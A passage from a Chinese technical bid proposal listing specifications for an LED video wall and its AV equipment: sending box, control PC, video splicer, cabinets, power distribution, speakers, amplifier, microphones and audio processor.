提供CMA、ILAC-MRA、CNAS认证并盖章的第三方权威机构的检测报告复印件。</li><li>为保证的大屏使用，满足日常和项目的要求，提供宽15.6m，高3m，尺寸偏差(宽和高)小于正负1%的LED显示屏，显示面积46.8㎡，根据实际安装情况，保证面积偏差小于正负3%，屏幕分辨率为16640点*3240点，以确保显示清晰，可以显示更多的细节，显示画面丰富，对于图像、视频和文本等内容，高分辨率可以呈现更清晰、更锐利的图像，使细节更加清晰可见；</li><li>白平衡亮度（亮度调节范围)：0-2000cd/m2，亮度范围更大，亮度均匀性97%；提供CMA、ILAC-MRA、CNAS认证并盖章的第三方权威机构的检测报告复印件。</li><li>静态对比度20000:1；。</li><li>显示屏水平/垂直视角：172°；</li><li>色温范围为1000K到18000K可调，其中在色温为6500K时，提供了以下100%、75%、50%、25%四档可调，在电平白场调节下，色温的误差为300K，该大屏的色域覆盖率为140%sRGB或115%NTSC或105%AdobeRGB或105%DCI-P3或80%BT2020，以保证能够显示更广泛的颜色范围，提供更丰富、准确的色彩表现。</li><li>刷新频率3840Hz；</li><li>可消除90%以上的拍摄摩尔纹现象，有效降低光强辐射，抑制摩尔纹，它能够减少光线对观看体验的干扰，提供更舒适的视觉效果。该大屏具有校正技术，可消除LED单元拼装造成的亮、暗线，通过校正技术可以消除这些线条，使显示效果更加均匀和一致。</li><li>具有高密集成光学设计技术和哑光涂层技术，能够实现出色的光学性能和外观质感，同时有效降低光反射和光污染；</li><li>该显示屏系统具有手动和自动调节亮度功能，用户可以手动调整屏幕亮度，也可以选择让设备根据环境亮度变化自动调节亮度，自动调节功能可以确保在不同环境条件下获得最佳的视觉效果。大屏还提供了节能模式、常规模式和高亮模式供用户选择。节能模式可以有效降低功耗，以节约能源并延长设备的使用寿命。常规模式提供了平衡的亮度和能耗，适合一般使用场景。而高亮模式则提供了更高的亮度水平，适用于需要更明亮显示的特殊场合。具备随环境亮度变化自动调节和可调节的显示亮度模式，LED大屏可以根据用户的使用需求和环境条件来灵活调整亮度，从而实现节能效果。这样的功能不仅可以降低能源消耗，还可以避免光污染，减少对周围环境的不必要光线辐射，提供更舒适的观看体验。</li><li>显示面通过了平面封装工艺，可确保大屏无点状及凸点造型，完全避免了在观看时出现不均匀的显示效果，采用了先进的像素排列技术和材料选择，避免了像素独立和二次灌封的问题。这不仅提高了显示器的可靠性和稳定性，还确保了显示画面的连续性和一致性。墨色一致性∆E＜0.5，显示面的表面光泽度30GU，保证了整体外观的美观；</li><li>显示屏系统，具备低亮高灰处理技术，即使在低亮度模式下，显示画面的灰度也不会损失，保持清晰度和层次感；采用了先进的低亮高灰处理技术，确保在低亮度条件下依然能够呈现出高灰度表现。通过优化背光调节和图像处理算法，解决了低亮度下灰度损失的问题，为用户提供更加清晰、细腻的视觉体验。对低亮环境进行了特殊的灰度优化处理。在低亮度条件下，大屏依然能够保持丰富的灰度层次和细节，避免灰度损失。通过精确控制每个像素的亮度和对比度，确保了显示画面在不同亮度设置下的灰度表现始终如一。</li><li>大屏符合HDR3.0版测试标准要求，大屏在信号输入、高动态范围、色域覆盖率、峰值亮度、黑色亮度和动态范围等方面均严格遵循HDR3.0版的测试标准要求。产品在各种参数指标上都达到了行业领先水平，能够为用户提供卓越的HDR体验。显示大屏支持多种输入信号格式，采用了先进的信号处理技术，确保信号传输的稳定性和清晰度。通过采用先进的HDR算法和背光调节技术，大屏实现了高动态范围的表现。在显示画面中，亮部和暗部的细节都能够得到充分的展现，为用户提供更加真实、生动的视觉体验。大屏具备广泛的色域覆盖率，能够还原更加真实的色彩。通过精确控制每个像素的色彩表现，实现了高色域覆盖率，为用户提供更加丰富多彩的视觉盛宴。大屏在峰值亮度和黑色亮度方面达到了行业领先水平。峰值亮度能够展现出明亮场景中的细节，而黑色亮度则能够呈现出深邃的黑色背景，增强画面对比度。通过先进的背光调节和图像处理技术，显示大屏实现了宽广的动态范围。在显示画面中，从暗部到亮部的过渡更加自然、平滑，为用户提供更加真实的视觉体验。</li><li>峰值功耗为583W/m2，平均功耗为188W/m2。支持智能（黑屏）节电功能，当开启智能节电功能时，LED大屏会自动将显示屏幕调整为黑屏状态，即关闭显示，以减少能源消耗，开启智能节电功能比没有开启节能45%以上；</li><li>系统，平均修复时间MTTR 为 5分钟，确保系统在出现故障时能迅速恢复正常运行状态；</li><li>蓝光危害属于无危害类，符合蓝关无危害要求。</li><li>表面硬度：满足HRC 8级和3H硬度；CMA、ILAC-MRA、CNAS认证并盖章的第三方权威机构的检测报告复印件。</li><li>显示大屏，大屏具备良好的电气隔离和绝缘性能，在抗电强度方面能实现一次电路与机身（包括可触及金属部件）之间施加1500V高强度电压，并且完全无击穿或者有放电现象，这种抗电强度的能力确保了大屏在使用过程中的可靠性和安全性。</li><li>为确保显示屏具备较高防护与安全性能，显示屏防护等级达到IP65；CMA、ILAC-MRA、CNAS认证并盖章的第三方权威机构的检测报告复印件。。</li><li>在屏体球面半径为1米处，整屏噪声不超过5分贝的条件下，确保低噪声水平。在这个距离上观察整个屏幕时，噪声水平非常低，不会对观看体验造成干扰。</li><li>该显示屏支持防电力远程窃密技术，提供的通信接口包含RS232接口1个。为了更好的阻止电力通信，采用了更加科学的信息相关技术方式阻止电力通信，这种技术可以通过对电力信号进行干扰或调制，使其无法被窃听或解码，从而保护通信的安全性，覆盖范围1KHz~1.5GHz，输入/输出电源滤波没计抑制信号强度，可以减少电源线上的电磁干扰，同时抑制信号的强度，具备良好的电磁兼容性。</li><li>维护方式支持前维护、后维护式两种，为本项目提供的方式为：前维护式。</li></ol><h3 id="LED发送盒"><a href="#LED发送盒" class="headerlink" title="LED发送盒"></a>LED发送盒</h3><h4 id="产品概述-1"><a href="#产品概述-1" class="headerlink" title="产品概述"></a>产品概述</h4><p>LED发送盒选择山东泰克自研的产品。LED发送盒是LED显示屏系统中的一个重要组成部分，具有以下主要作用：</p><p>数据处理和控制：LED发送盒负责接收来自图像源（如计算机、视频处理器等）的数据信号，并对信号进行处理和解码。它将输入的图像数据转换为适合LED显示屏的控制信号，以控制LED模组的显示内容和亮度。</p><p>显示内容管理：LED发送盒具备显示内容管理的功能。通过连接到计算机或其他控制设备，发送盒可以接收和解析各种图像、视频和动画等内容，实现对LED显示屏上显示内容的控制和管理。它可以支持多种显示格式和分辨率，并具备灵活的显示内容切换和调整功能。</p><p>数据传输和分发：LED发送盒负责将处理后的控制信号传输给LED显示屏的各个模组。它通过数据传输接口（如以太网、光纤等）将控制信号传送到每个模组，确保各个模组按照统一的指令进行显示内容的呈现。发送盒还可以支持多种传输协议，如DMX、DVI、HDMI等，以适应不同的应用需求。</p><p>监控和诊断：LED发送盒通常具备监控和诊断功能，能够实时监测LED显示屏的工作状态和性能。它可以检测和报告LED模组的亮度、色彩均匀性、通信状态等信息，帮助用户及时发现和解决潜在问题，确保显示屏的正常运行。</p><p>系统集成和扩展：LED发送盒可以与其他控制设备和系统进行集成，如音频设备、触摸屏、传感器等。它可以通过接口扩展和连接外部设备，实现更多的功能和交互性，满足特定应用场景的需求。</p><h4 id="实施方案-1"><a href="#实施方案-1" class="headerlink" title="实施方案"></a>实施方案</h4><ol><li>所提供的产品不仅输入分辨率支持高达1920×1200像素，而且用户可根据需要自定义设置分辨率，以适配不同的显示需求。</li><li>单个LED发送盒能够驱动最多230万像素的显示面积，横向最多可支持4096像素点，纵向最高可支持2560像素点，具备出色的带载能力。</li><li>设备配备配置6个千兆以太网输出端口和1个DVI输入端口，同时拥有双USB2.0接口，以便快速数据传输，满足多种通讯和数据传输需求。</li><li>支持调整亮度和色温，以及在低亮度下保持高灰度输出，确保图像质量优异，可根据环境和需求进行调节，提供更丰富的视觉效果和适应性。</li></ol><h3 id="控制电脑"><a href="#控制电脑" class="headerlink" title="控制电脑"></a>控制电脑</h3><h4 id="产品概述-2"><a href="#产品概述-2" class="headerlink" title="产品概述"></a>产品概述</h4><p>控制电脑选用品牌为技嘉，型号为JIJIA-08-TSJ的电脑作为控制电脑。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/cbe9fb0d8779aa1776f42368f0c3700f.png"></p><h4 id="实施方案-2"><a href="#实施方案-2" class="headerlink" title="实施方案"></a>实施方案</h4><p>1）处理器采用先进的14纳米制程工艺，拥有8个核心和16个线程，主频频率可达3.9GHz，处理器型号为：I7-12700F，它在高负载任务下能够提供出色的性能表现。同时，它还配备了智能缓存技术，能够根据应用程序的需求自动调整缓存大小，提供更快的响应速度和更高的运行效率。</p><p>2）电脑配置16GB DDR4内存，是一种高速、可靠的内存模块。它采用了先进的DDR4技术，具有更高的频率和更低的延迟，能够提供更流畅的多任务处理和应用程序运行。</p><p>3）配置高性能的512GB SSD固态硬盘，它采用闪存存储技术，具有更快的读写速度和更低的响应时间，能够提供更快的系统启动速度和应用程序加载速度，还具有较高的数据传输速度和可靠性。</p><p>4）配置一款高性能的显卡：RTX3060Ti。它采用了先进的图形处理架构，具有强大的计算能力和出色的图形渲染效果。并且有8GB的显存容量足以支持多媒体内容的处理，同时还能够提供逼真的图像效果。此外，该显卡还支持光线追踪技术和人工智能加速，为用户带来更加震撼的视觉体验和更高的图形性能。</p><h3 id="管理软件"><a href="#管理软件" class="headerlink" title="管理软件"></a>管理软件</h3><h4 id="产品概述-3"><a href="#产品概述-3" class="headerlink" title="产品概述"></a>产品概述</h4><p>管理软件为山东泰克自研软件，LED显示屏中的管理软件负责管理和控制显示内容、亮度、播放模式等参数，实现远程控制、调度和监控，确保显示效果和运行稳定。</p><h4 id="实施方案-3"><a href="#实施方案-3" class="headerlink" title="实施方案"></a>实施方案</h4><ol><li>LED显示屏幕控制软件，是一款功能强大的软件，专为LED显示屏设计而成。它具有高度兼容性，充分发挥硬件设备的性能优势。该软件提供了丰富的控制功能，包括亮度调节、色彩管理、画面设置等，用户可以通过直观的界面轻松调整显示屏的各项参数，实现个性化的显示效果。</li><li>LED显示屏幕控制软件，支持校正软件。是一款专业级的软件，旨在确保LED显示屏的亮度输出准确无误。能够精确测量显示屏的亮度，提供详细的校正报告和图表，帮助用户快速调整亮度参数，达到最佳的视觉效果。此外，该软件还支持多种校正模式和自动化校正功能，提升校正效率和准确性。</li><li>LED显示屏幕控制软件，支持LED显示屏专业维修软件。是一款针对LED显示屏维修和故障排除而设计的软件。它提供了全面的维修功能，包括故障诊断、电路测试、亮度修复等。用户可以通过该软件快速定位和解决显示屏的故障问题，提高维修效率和准确性。</li><li>一款专业的多媒体播放软件，旨在实现对LED显示屏上内容的高质量播放和管理。该软件支持多种媒体格式的播放，并提供了丰富的播放控制功能，如循环播放等。</li></ol><h3 id="视频拼接器"><a href="#视频拼接器" class="headerlink" title="视频拼接器"></a>视频拼接器</h3><h4 id="产品概述-4"><a href="#产品概述-4" class="headerlink" title="产品概述"></a>产品概述</h4><p>视频拼接器选用山东泰克自研产品，视频拼接器是一种设备，用于将多个视频信号源进行合并和切换，实现视频信号的拼接和切换，以便在显示屏上同时显示多个视频源或切换不同视频源的显示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/54670273a802063ef7e75121014207b9.png"></p><h4 id="实施方案-4"><a href="#实施方案-4" class="headerlink" title="实施方案"></a>实施方案</h4><ol><li>该视频拼接器配备28个HDMI2.0输入端口，其中4个端口支持4K高清输入，并具有28个输出通道，适用于复杂的视频拼接场景。</li><li>为了系统整体的高效运作，视频拼接器与LED显示屏为统一山东泰克自研产品，确保了技术兼容和稳定性。</li><li>设备附带LED拼接软件，改拼接软件可以进行LED无缝屏接、开窗、移动等功能，可以满足日常大屏的多种展示需求。</li><li>拼接器支持广泛的视频输入选项，包括但不限于HDMI、DVI、VGA、CVBS、SDI、IP和光纤输入，以满足各种输入需求。该设备能够接收各种类型的视频信号输入。HDMI、DVI和VGA是常见的数字视频接口，CVBS则是模拟视频信号的标准接口。SDI接口常用于专业视频传输，而IP和光纤则代表了网络传输的未来趋势。这样的多样性确保了设备在各种应用场景中都能发挥出色的性能，无论是传统的模拟信号源还是先进的数字网络信号源，都能得到完美的支持。</li><li>设备提供多样的视频输出选择，支持HDMI、DVI、SDI和光纤等信号的输出，为不同输出需求提供灵活选择。HDMI和DVI是数字视频接口的代表，SDI则是专业视频传输的标准接口，而光纤则提供了长距离和高带宽的传输能力。这样的输出配置确保了设备能够与各种显示设备无缝对接，无论是高清大屏还是投影设备，都能保证高质量的画面输出。</li><li>内置EDID编辑功能，允许用户自定义和优化显示设备的EDID信息，以获得最佳显示效果。EDID编辑功能对于设备的兼容性和画面显示很重要。通过EDID编辑，设备能够更好地管理显示参数和信号源的匹配，确保最佳的画面效果。此外，EDID编辑功能还能帮助用户解决不同设备间的不兼容问题，提高系统的稳定性。</li><li>视频拼接器具有多种图像处理功能，包括图像开窗（单开多个独立小窗口）、窗口叠加（窗口混合和叠加效果）、窗口漫游（自由移动窗口可视区）、缩放（自由缩小放大）以及字符叠加（窗口中叠加字符）等。这些功能是视频处理的核心要求，它们使得设备能够实现多画面显示和控制。图像开窗功能允许用户在主画面上打开一个独立的窗口，展示不同的内容。窗口叠加则可以将多个画面层叠在一起，创造出丰富的视觉效果。窗口漫游和缩放功能则提供了灵活的画面调整能力，使用户能够轻松地调整和移动窗口的大小和位置。字符叠加功能则常用于在画面上添加文字信息，如标题、时间和日期等。这些功能的支持使得设备在视频处理方面具有强大的表现力。</li><li>支持场景的保存和快速读取，以及底图设置和图像截取等高级功能，提高用户操作便利性。通过保存和读取预定义场景的设置，用户可以快速调整设备的状态和参数，无需每次都从头开始配置。底图功能允许用户在主画面上添加一个固定的背景图像，增强画面的视觉效果。图像截取功能则允许用户从主画面中截取一部分内容，进行单独处理或保存。这些功能的支持使得设备在使用上更加便捷和高效。</li><li>具有信号源预监功能，可以实时预览输入信号，确保输入源的正确性和效果。预监功能对于设备的操作和调试很重要。通过实时预览输入信号源的画面，用户可以及时发现和解决信号传输中的问题，确保画面的质量和稳定性。此外，预监功能还能帮助用户快速选择合适的信号源，提高系统的可靠性。</li><li>设备设计了电源冗余备份机制，保障系统在电源异常时的稳定运行。在主电源出现故障时，备用电源能够自动接管，确保设备的连续运行。这种设计大大提高了设备的可靠性和稳定性，减少了因电源故障导致的停机时间。同时，这也为用户提供了一种安全保障，防止因电源问题而造成的数据丢失或设备损坏。电源冗余备份是一项重要的功能，它使得设备在面临电源故障时仍能保持稳定的运行状态，从而提高了整个系统的可靠性</li><li>支持视频网络运维管理协议，能实时监控设备状态，并在发生异常时及时进行报警，保障系统安全稳定运行。通过视频网络运维管理协议，设备能够与远程管理系统进行无缝对接，实现设备的集中管理和控制。实时监测设备运行状态的功能有助于及时发现潜在的问题或故障，提前采取相应的措施加以解决。当设备出现异常情况时，报警功能会立即触发，向相关人员发送警报信息，以便及时处理和修复问题。这种智能化的运维管理方式大大提高了设备的可维护性，减少了人工干预的需求，同时也有助于提高整个系统的稳定性和可靠性。</li></ol><h3 id="机柜"><a href="#机柜" class="headerlink" title="机柜"></a>机柜</h3><h4 id="产品概述-5"><a href="#产品概述-5" class="headerlink" title="产品概述"></a>产品概述</h4><p>机柜采用图腾的42U机柜。该机柜主要用于存放视频处理器及音响有关设备。如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/06059f7f99a6f97e55f8c6528a1060c1.png"></p><h4 id="实施方案-5"><a href="#实施方案-5" class="headerlink" title="实施方案"></a>实施方案</h4><ol><li>提供42U标准机柜：用于安装各种标准尺寸的服务器、网络和通信设备。</li><li>材质：机柜采用优质冷轧钢材料制成，这种材料通常具有良好的强度和耐用性。使用脱脂静电喷塑工艺进行表面处理，可以提供一层保护性涂层，防止腐蚀、刮擦，并提供美观的外观。</li><li>满足防护等级IP20：可以保证机柜的防尘、防水能力。</li><li>附件：</li></ol><ul><li>提供固定支脚：为机柜提供稳定的站立能力，确保即使在装载重设备时也能保持稳定。</li><li>提供滚轮：使机柜便于移动，方便在数据中心等环境中进行布局调整或维护。</li><li>提供风扇：用于散热，确保机柜内部设备运行在适宜的温度下。</li><li>提供托盘：用于放置不能直接安装在机架上的设备，如小型服务器、键盘、鼠标等。</li><li>提供电源排插：提供多个电源插口，用于为机柜内的设备供电。</li></ul><h3 id="配电柜"><a href="#配电柜" class="headerlink" title="配电柜"></a>配电柜</h3><h4 id="产品概述-6"><a href="#产品概述-6" class="headerlink" title="产品概述"></a>产品概述</h4><p>配电柜选用正泰220V/380V挂式配电柜，该配电柜主要用于大屏及音响设备的电源分配及供电，如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/deb1bbef2296470d437e38e3239f6593.png"></p><h4 id="实施方案-6"><a href="#实施方案-6" class="headerlink" title="实施方案"></a>实施方案</h4><ol><li><p>提供功率30KW的高性能配电柜，以确保可靠地管理和分配电力，以满足连接到柜内的各种电气设备的需求。该配电柜采用先进的技术和设计，能够在不超过30KW的功率限制下，确保电气设备的正常运行，并提供充足的电力支持。</p></li><li><p>配电柜的输入电压范围为380/220V，同时具有出色的电压稳定性。它能够适应电网波动，输入电压在正常工作范围内的变化不超过10％，从而保证电力供应的稳定性和可靠性。</p></li><li><p>配电柜完全支持50HZ的帧频，这是标准的电力系统频率。无论是工业领域还是商业领域，配电柜都能有效处理和分配来自电网的50HZ电源，以满足各种电气设备的要求。</p></li><li><p>配电柜支持多种控制方式，包括手动和自动切换、本地和远程PLC控制，并配备级联功能。手动和自动切换功能可根据需要灵活选择运行模式，本地和远程PLC控制方式使您能够方便地监控和控制配电柜的运行状态。此外，级联功能可以将多个配电柜连接在一起，实现更大范围的电力管理和分配。</p></li><li><p>配电柜具备高效的短路保护功能，能够迅速检测到短路情况并采取相应措施。当发生短路时，配电柜会自动切断电源，以保护电气设备和系统的安全运行。这种保护功能可最大程度地减少短路事件对电力系统的影响，并提供额外的安全性。配电柜还采用延时启动方式，这是一种经过精心设计的启动模式。延时启动功能可以在配电柜投入运行之前提供额外的时间，确保各个电气设备在启动过程中稳定运行。这种启动方式有助于减少启动时的电流冲击，并保护电气设备免受损坏。延时启动功能还可以提高系统的可靠性和稳定性，确保正常的运行环境。</p></li></ol><h3 id="钢架结构"><a href="#钢架结构" class="headerlink" title="钢架结构"></a>钢架结构</h3><h4 id="产品概述-7"><a href="#产品概述-7" class="headerlink" title="产品概述"></a>产品概述</h4><p>钢架结构为大屏的支撑固定材料，根据现场实施情况定制。</p><h4 id="实施方案-7"><a href="#实施方案-7" class="headerlink" title="实施方案"></a>实施方案</h4><ol><li>显示屏支撑钢架结构经过精心设计，以确保稳固、可靠地支撑各种类型和尺寸的显示屏。这个钢架结构经过工程师的精心计算和优化，以承受显示屏的重量和应力，并提供稳定的支撑和保护。</li><li>采用定制化材料来制造这个钢架结构，确保其具备出色的性能和适应性。根据需求和要求，选择高品质的材料，并进行定制化加工，以确保钢架结构在各种环境和应用场景下都能发挥最佳性能。</li></ol><h3 id="线阵列音柱"><a href="#线阵列音柱" class="headerlink" title="线阵列音柱"></a>线阵列音柱</h3><h4 id="产品概述-8"><a href="#产品概述-8" class="headerlink" title="产品概述"></a>产品概述</h4><p>线列阵音柱选用品牌为JBL，型号为CBT50LA-1的音柱，该音柱主要用于音响的外放扩大作用。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6e6d46b77ca286da214ee32a5c814193.png"></p><h4 id="实施方案-8"><a href="#实施方案-8" class="headerlink" title="实施方案"></a>实施方案</h4><ol><li>线阵列音柱的性能能确保在低频端的下限频率不得高于75赫兹，音柱必须能够准确地再现至此频率的低音部分，确保音质的完整性和丰富性。同时，在高频端，音柱应能够无损失地传达至少19千赫兹的声音频率，以保证高音的清晰度和细节，满足高保真音频输出的严苛要求。</li><li>线阵列音柱应在1瓦的功率输入和1米的测试距离下，能够提供不低于98分贝的声压级输出。这一要求确保了音柱在相对较低的功率条件下就能产生足够的声压级，从而表明其高效的声音转换能力，适用于各种大小的场合。</li><li>线阵列音柱标称阻抗的设定值不应小于8欧姆，这一参数保证了音柱与功放的匹配性，以及在多音柱串联应用时的稳定性和可靠性。</li><li>线阵列音柱能够持续承受至少600瓦的功率输入，而不会出现性能下降。这一指标确保了音柱在长时间的高负荷工作状态下依然能保持结构和性能的稳定性，从而保障了其耐用性和长期的可靠性。</li><li>线阵列音柱的低音单元的口径为4个6.5英寸，并且使用钕磁材料，这样的设计能够确保低音的深沉和力量。同时，高音单元至少为2个1.4英寸的钕磁单元，这一配置能够保证高频的清晰度和穿透力，同时钕磁材料的使用进一步提升了单元的敏感度和声音的细节表现。</li><li>线阵列音柱连续最大声压级大于或等于125分贝，而峰值最大声压级达到或超过131分贝，这样的声压级表明音柱能够在极端要求的应用场景中，如大型现场音乐会或户外活动，提供足够的音量，以覆盖广阔的听众区域，同时保持音质的清晰不失真。</li><li>线阵列音柱标称覆盖角度的设定为水平方向至少110度，垂直方向至少23度。</li><li>产品品牌及型号详见1.1.9.1产品概述</li></ol><h3 id="多功能商用功率放大器"><a href="#多功能商用功率放大器" class="headerlink" title="多功能商用功率放大器"></a>多功能商用功率放大器</h3><h4 id="产品概述-9"><a href="#产品概述-9" class="headerlink" title="产品概述"></a>产品概述</h4><p>多功能商用放大器选用伊乐浦，型号为MA-3800的多功能商用功率放大器，多功能商用放大器是一种设备，具备音频和视频信号放大、切换、混合、分配等功能，可用于商业场所的音视频系统，实现信号处理和多路输出，提供高质量的音视频体验。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/664b7a805d7264c57a8a45d83269d432.png"></p><h4 id="实施方案-9"><a href="#实施方案-9" class="headerlink" title="实施方案"></a>实施方案</h4><ol><li>多功能商用功率放大器采用了先进的三级H类线路设计，这种设计不仅实现了高效率的功率转换，而且还大幅度减小了设备体积，使其更适合紧凑空间的安装需求。在元件选择上，放大器广泛采用了高精度的表面贴装技术（SMD）器件，并通过自动化生产工艺进行组装，这大大提高了产品的可靠性和一致性。此外，该放大器还特别配置了具有磁屏蔽层的高效率环形变压器来有效地抵抗电磁干扰。为了保持设备在高负荷运行时的性能稳定性，放大器还配备了自动变速风扇和优化的散热系统，确保了长时间运行中的热管理和设备安全。</li><li>每个通道的输出功率都能够达到950瓦，测试条件为8欧姆负载，这一功率水平确保放大器能够驱动大多数商用扬声器，提供充足的音量和动态范围，满足商业环境中的应用需求。</li><li>在4欧姆负载的条件下，每个通道的输出功率都能够达到1350瓦，这表明放大器能在更低阻抗的负载下工作，提供更高的功率输出，适用于要求更大声压级的场合。</li><li>在桥接模式下，放大器可以提供超过2700瓦的输出功率，测试条件为8欧姆负载。这种高功率输出能力使得放大器能够在需要极高音量输出的场合中提供强大的驱动力。</li><li>放大器的频率范围优于20赫兹至20千赫兹，偏差控制在±1分贝之内，确保声音输出的平坦性和宽广的频率覆盖，从而能够精确再现音频信号的每一个细节。</li><li>总谐波失真（THD）低于0.1%，这一数值体现了放大器在信号放大过程中保持音质纯净度的能力，几乎没有可察觉的失真产生，为听众提供清晰、逼真的音频体验。</li><li>阻尼系数为220:1，放大器对扬声器的控制能力非常强，能够快速精确地响应扬声器的运动，特别是在处理低频动态时，能够提供紧凑的低频响应和减少不必要的振动。</li><li>转换速率为35伏/微秒，快速的响应速度意味着放大器能够在短时间内处理高速变化的信号，保证了信号在放大过程中的忠实度和动态响应。</li><li>电压放大倍数为110，放大器具有很高的放大能力，可以将输入信号放大到足够的电平，以驱动连接的扬声器。</li><li>信噪比为100分贝（A计权），这保证了放大器输出的音频信号远高于背景噪音水平，确保了音质的清晰度和透明度。</li><li>分离度为60分贝，输入共模抑制比（CMRR）为60分贝，这些指标表明放大器在处理立体声信号时能够很好地区分左右通道，减少通道间的相互干扰，同时也显示了放大器在抵抗同一输入信号上的共模噪声方面的能力。</li><li>前面板配备了多种指示灯，包括保护指示灯、削波指示灯和信号指示灯，这些指示灯为用户提供了即时的设备状态反馈，使得用户能够迅速识别设备运行状况，如过载、信号状态和其他关键的运行信息，以便及时进行调整或维护。</li><li>产品品牌及型号详见产品概述</li></ol><h3 id="无线手持话筒"><a href="#无线手持话筒" class="headerlink" title="无线手持话筒"></a>无线手持话筒</h3><h4 id="产品概述-10"><a href="#产品概述-10" class="headerlink" title="产品概述"></a>产品概述</h4><p>无线手持话筒选用品牌为宝麦风 ，型号为BM-9005S的产品，该产品具备稳定的声音录入及输出质量，保障声音的还原度及清晰度。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4236bf5ac480df1d11a4f564a152b14f.png"></p><h4 id="实施方案-10"><a href="#实施方案-10" class="headerlink" title="实施方案"></a>实施方案</h4><ol><li>射频载波范围(UHF)：该无线手持话筒运用了先进的超高频（UHF）技术，具有宽广的射频载波频率范围，从603兆赫兹延伸至935兆赫兹。这一广阔的频率覆盖确保了话筒在多种环境中均能找到清晰无干扰的传输频道。</li><li>振荡方式：采用精密的锁相环（PLL）合成技术，确保话筒在任何情况下都能保持稳定的频率输出。PLL锁相环合成技术提供了优越的频率精度和稳定性，使得话筒在复杂的电磁环境下仍然能够维持一致的性能。</li><li>工作距离：在理想的无干扰环境下，该无线手持话筒能够提供高达90米的稳定工作距离，这使得用户在较大的会场或舞台上使用时，不会受到移动距离的限制。</li><li>搜频设置：内置了先进的传输频率搜索功能，使得用户能够自动扫描并选择最佳的工作频率，极大地简化了话筒的设置流程，并提高了使用的便利性。</li><li>制式：采用调频（FM）传输方式，确保了声音信号的高保真传输，减少了信号在传输过程中的失真和干扰，提供了更加清晰和稳定的音质输出。</li><li>预设通道：提供32个预设通道，用户可以根据不同的场景和需求，快速选择合适的通道进行使用，这大大提高了话筒的灵活性和多场合的适应能力。</li><li>频响范围：频率响应范围从100赫兹到10千赫兹，偏差控制在±3分贝之内，保证了从低频到高频的声音传输均匀和全面，满足了日常语音传输的需求。</li><li>频带宽度：拥有宽达120兆赫兹的频带宽度，为用户提供了足够的频率选择空间，以适应不同的使用环境和频率规划需求。</li><li>系统失真/THD总谐波失真：在1千赫兹的测试频率下，总谐波失真小于5%，这一指标显示了话筒在正常工作状态下的高保真度和低失真特性。</li><li>信噪比：信噪比超过50分贝（A计权），话筒输出的声音信号强度远大于背景噪声，确保了清晰的语音传输和接收。</li><li>电源要求：支持宽电压输入，从100伏至240伏，适应全球不同地区的电源标准，使得话筒可以在世界各地使用而无需额外的电源适配器。</li><li>工作温度范围：话筒能在0至50摄氏度的温度范围内稳定工作，额定功率为10瓦，交流频率为50/60赫兹，能够适应多变的环境条件，保持设备的可靠性和稳定性。</li></ol><h3 id="音频处理器"><a href="#音频处理器" class="headerlink" title="音频处理器"></a>音频处理器</h3><h4 id="产品概述-11"><a href="#产品概述-11" class="headerlink" title="产品概述"></a>产品概述</h4><p>音频处理器选用品牌为山东泰克，型号为C89NL，音频处理器是一种设备，用于对音频信号进行处理和优化，包括均衡、压缩、混响、延迟等功能，以改善音频质量、增强声音效果，并满足不同场景和需求的音频处理和调整。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/cb442847ec254f13277125ba8390b0c9.png"></p><h4 id="实施方案-11"><a href="#实施方案-11" class="headerlink" title="实施方案"></a>实施方案</h4><ol><li>输入配置：本音频处理器配备了四路模拟平衡输入通道，以及两路AES/EBU数字输入，这样的输入组合不仅提供了丰富的连接可能性，也确保了与各种音频源的兼容性，无论是模拟信号还是数字信号。</li><li>输出配置：设备提供了八路模拟平衡输出，这样的多路输出设计使得音频处理器能够灵活地应对多种输出需求，非常适合复杂的音频系统布局。</li><li>最大输入电平：音频处理器能够承受高达+23dBu的输入电平，这表明设备具有极高的信号承受能力，能够处理来自各种音频设备的强信号输入而不失真。</li><li>最大输出电平：同样地，音频处理器能提供高达+23dBu的输出电平，保证了输出信号的强度，足以驱动后续的放大器或其他音频处理设备。</li><li>频率响应：音频处理器具有从20赫兹到20千赫兹的频率响应范围，并且频响偏差控制在±0.5分贝内，确保了音频信号的完整性和高保真度。</li><li>输入/输出动态范围：具有120分贝（A计权）的输入/输出动态范围，这一宽广的动态范围使得处理器能够精确地处理从微弱到强烈的信号，而不会丢失细节。</li><li>总谐波失真+噪声：处理器的总谐波失真加噪声比率低至0.004%，这一极低的失真率意味着几乎所有的音频信号都将被保真地放大和处理。</li><li>采样率：支持高达96千赫兹的采样率，这保证了即使是最细微的高频细节也能被捕捉和再现，满足了高分辨率音频处理的需求。</li><li>信噪比：具有高达101分贝的信噪比，这一高信噪比保证了背景噪音被有效抑制，使得输出信号清晰而纯净。</li><li>A/D、D/A转换：采用64位的模数转换（A/D）和数模转换（D/A），这种高精度的转换保证了信号在数字和模拟之间转换时的极致精确性和无损质量。</li><li>均衡器：每个输入和输出通道都配备了10段参数均衡（PEQ），这为用户提供了强大的音频调整工具，以达到精细的音质控制。</li><li>滤波器类型：支持多种滤波器类型，包括有限冲击响应（FIR），Bell型，高架（High Shelf），低架（Low Shelf），陷波（Notch），全通（Allpass），带通（Band Pass），高通（High Pass），低通（Low 